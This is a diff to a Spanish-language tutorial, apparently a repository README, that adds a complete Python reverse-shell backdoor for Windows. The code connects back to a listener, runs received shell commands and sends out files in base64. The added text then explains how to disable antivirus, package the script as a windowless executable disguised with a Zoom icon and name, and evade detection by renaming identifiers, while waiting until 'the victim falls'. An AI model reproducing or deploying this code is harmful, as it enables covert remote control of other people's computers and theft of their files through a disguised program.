@@ -1067,10 +1067,82 @@ escuchar.run()
 
 
 
+# Seguimos mejorando el codigo, con sys y DEVNULL 
+
+* Mejora necesaria para el backdoor-windows.py para que no tengamos ningun error, y hacerlo INVISIBLE en el sistema.
+
+```bash
+import socket
+import subprocess
+import json
+import os
+import base64
+import sys
+
+class Backdoor:
+
+    def __init__(self,ip,port):
+        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        self.connection.connect((ip,port))
+        self.connection.send("\n[+] Conexion establecida \n".encode())
+    
+    def envio_seguro(self, datos):
+        json_data = json.dumps(datos)
+        self.connection.send(json_data.encode())
+
+    def reception_segura(self):
+        json_data = ""
+        
+        while True:
+            try:
+             
+               json_data = self.connection.recv(1024).decode("utf-8")
+               return json.loads(json_data)
+            except ValueError:
+                continue
+    
+    def ejecutar_comando(self,comando):
+        DEVNULL = open(os.devnull,"wb")
+        return subprocess.check_output(comando,shell=True,stderr=DEVNULL,stdin=DEVNULL).decode("windows-1252")
+
+    def cambiar_directorio(self,ruta):
+        os.chdir(ruta)
+        return "[+] Cambiando de directorio a {} \n".format(ruta)
+    
+    def leer_archivo(self,ruta):
+        with open(ruta,"rb") as file:
+            return base64.b64encode(file.read()).decode("utf-8")
+
+    def run(self):
+        while True:
+            comando = self.reception_segura()
+            try:
+                if comando[0] == "salir":
+                    self.connection.close()
+                    sys.exit()
+                elif comando[0] == "cd" and len(comando) > 1:
+                    resultado_comando = self.cambiar_directorio(comando[1])
+                elif comando[0] == "descargar":
+                    resultado_comando = self.leer_archivo(comando[1])
+                else:
+                    resultado_comando = self.ejecutar_comando(comando)
+            except Exception:
+                resultado_comando = "[-] Error de ejecution \n"
+
+            self.envio_seguro(resultado_comando)
+       
+backdoor = Backdoor("192.168.1.133",4444)
+backdoor.run()
+```
+# Parrot (Target)
+![importaMOS SYS](https://user-images.githubusercontent.com/97669969/157521319-5e84467d-18bb-4a05-a7b6-fb82149ce8a7.png)
+
+
 # BACKDOOR INDETECTABLE
 
-* A dia de hoy este backdoor sigue indetectable por los antiviruses de windows, pero nunca se sabe cuando implementaran nuevas escrituras en los antiviruses.
-* Como te diste cuenta en el backdoor use palabras como "backdoor" "ejecutar_comando" lo cual salta las alarmas y no es la mejor manera de desarrollar un virus un backdoor, pero aqui es una clase de desarroloo de un backdoor desde 0.
+* A dia de hoy este backdoor sigue indetectable por el antivirus puesto que es un archivo.py, y no .exe , enseguida lo convertimos a exe.
+
+* Como te diste cuenta en el backdoor use palabras como "backdoor" "ejecutar_comando" lo cual salta las alarmas y no es la mejor manera de desarrollar un virus un backdoor, pero aqui es una clase de desarrollo de un backdoor desde 0'.
 
 
 
@@ -1078,16 +1150,67 @@ escuchar.run()
 # Y como lo hacemos indetectable?
  
  
- 
+ # La Invisibilidad, y como se consigue>?
  ```bash
-Lo mejor seria usar palabras y frases cuales solo tu reconozcas, sin que ningun antivirus pueda leerlos como amenazas.
+Lo mejor seria usar palabras y frases cuales SOLO tu reconozcas! Sin que ningun antivirus pueda leerlos como amenazas.
+
 ```
 
 
 
 
+# BACKDOOR ".EXE"
 
 
+# En primer lugar dezactiva tu antivirus, para asegurar que no interrumpa el trabajo.
+
+![antivirus](https://user-images.githubusercontent.com/97669969/157541384-efc9e133-929a-415d-93fa-640123718ea7.png)
+
+
+* Necesitamos un icono , puede ser tipo zoom, whatsapp, tiktok, etc. de extension .ico 
+* Todo lo pones en la misma carpeta tanto el backdoor como el icono, ex > Downloads.
+
+* Abre cmd (dir , cd Downloads, chdir, aseguramos que todo esta presente en la carpeta Downloads.
+
+```bash
+pip -V
+```
+* Si no esta lo instalamos :
+
+```bash
+pip install pyinstaller
+```
+
+* Generamos el .exe 
+```bash
+pyinstaller --onefile --windowed --noconsole -i=zoom.ico backdoor-windows.py --name zoom
+```
+
+
+
+# Diccionario
+
+* --onefile ( que genere menos archivos)
+* --windowed (ocultar consola)
+* --noconsole (que no abra la consola)
+* -i=zoom.ico ( imagen de executable, en mi caso elegí zoom)
+* backdoor-windows.py (nombre del backdoor)
+* --name (el nombre que le voy a poner a my backdoor)
+
+![zoom windows](https://user-images.githubusercontent.com/97669969/157544457-163f87bc-bae0-40d0-ae38-5d957f05b613.png)
+* En la carpeta dist , se encuentra el .exe.
+
+
+# Al abrir el .exe, el listener abre conexion enseguida, el listener tiene que correr siempre hasta que la victima cae.
+![zoom ubuntu](https://user-images.githubusercontent.com/97669969/157545308-a79ea6c7-3afb-494b-91b2-4f5f623fde1b.png)
+
+
+
+
+
+# Concluio de que esta clase , este backdoor a dia de hoy es indetectable por los antiviruses, siempre que se siga las mejores practicas de codigo y frases/funciones,variables que declares tiene seguir la regla de la Invisibilidad!
+
+# TMCYber' was here./
 
 
 
